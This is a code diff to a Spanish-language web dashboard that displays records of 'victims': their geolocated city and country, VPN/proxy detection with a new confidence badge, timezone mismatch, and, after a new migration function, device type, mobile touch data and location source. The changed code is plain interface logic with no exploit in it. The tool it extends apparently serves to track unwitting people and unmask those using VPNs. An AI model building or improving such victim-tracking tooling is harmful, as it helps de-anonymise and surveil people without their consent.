@@ -301,6 +301,7 @@
 
     <div class="controls">
         <button onclick="loadData()">🔄 Actualizar</button>
+        <button onclick="migrateData()" class="secondary">🔧 Migrar Datos Antiguos</button>
         <button onclick="clearData()" class="danger">🗑️ Limpiar Datos</button>
         <button onclick="exportData()" class="secondary">💾 Exportar JSON</button>
         <button onclick="exportCSV()" class="secondary">📊 Exportar CSV</button>
@@ -465,7 +466,14 @@
                 // Ubicación con VPN badge
                 let locationHTML = `${locationBadge} ${victim.network?.city || 'Unknown'}, ${victim.network?.country || 'Unknown'}`;
                 if (victim.network?.vpnDetection?.likelyVPN) {
-                    locationHTML += '<span class="vpn-badge" title="Probable VPN/Proxy">VPN</span>';
+                    const confidence = victim.network.vpnDetection.confidence || 'low';
+                    const confidenceEmoji = {
+                        'high': '🔴',
+                        'medium': '🟡',
+                        'low': '🟢'
+                    };
+                    const emoji = confidenceEmoji[confidence] || '🔴';
+                    locationHTML += `<span class="vpn-badge" title="VPN Confianza: ${confidence}">${emoji} VPN</span>`;
                 }
 
                 const date = new Date(victim.timestamp).toLocaleString('es-MX');
@@ -507,6 +515,13 @@
             // VPN Detection
             if (victim.network?.vpnDetection) {
                 const vpn = victim.network.vpnDetection;
+                const confidenceColor = {
+                    'high': '#ff6b6b',
+                    'medium': '#ffa500',
+                    'low': '#4CAF50'
+                };
+                const color = confidenceColor[vpn.confidence] || '#888';
+
                 html += `
                     <div class="details-section">
                         <h4>🛡️ Detección de VPN/Proxy</h4>
@@ -514,6 +529,10 @@
                             <div class="detail-item">
                                 <div class="detail-label">Probable VPN</div>
                                 <div class="detail-value">${vpn.likelyVPN ? '⚠️ SÍ' : '✅ NO'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Confianza</div>
+                                <div class="detail-value" style="color: ${color}; font-weight: bold; text-transform: uppercase;">${vpn.confidence || 'low'}</div>
                             </div>
                             <div class="detail-item">
                                 <div class="detail-label">Timezone Mismatch</div>
@@ -648,6 +667,37 @@
             if (seconds < 3600) return 'Hace ' + Math.floor(seconds / 60) + ' min';
             if (seconds < 86400) return 'Hace ' + Math.floor(seconds / 3600) + ' hrs';
             return 'Hace ' + Math.floor(seconds / 86400) + ' días';
+        }
+
+        async function migrateData() {
+            if (confirm('¿Quieres actualizar todos los registros antiguos con los nuevos campos?\n\nEsto agregará:\n- Detección de VPN mejorada\n- Tipo de dispositivo\n- Datos táctiles móviles\n- Fuente de ubicación')) {
+                try {
+                    const button = event.target;
+                    button.disabled = true;
+                    button.textContent = '⏳ Migrando...';
+
+                    const response = await fetch('/api/migrate', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+
+                    const result = await response.json();
+
+                    if (result.success) {
+                        alert(`✅ Migración completada!\n\nTotal: ${result.totalRecords}\nActualizados: ${result.updated}\nSin cambios: ${result.unchanged}\nErrores: ${result.errors}`);
+                        loadData();
+                    } else {
+                        alert('❌ Error en migración: ' + result.error);
+                    }
+
+                    button.disabled = false;
+                    button.textContent = '🔧 Migrar Datos Antiguos';
+                } catch (error) {
+                    alert('❌ Error al migrar datos: ' + error.message);
+                    event.target.disabled = false;
+                    event.target.textContent = '🔧 Migrar Datos Antiguos';
+                }
+            }
         }
 
         async function clearData() {
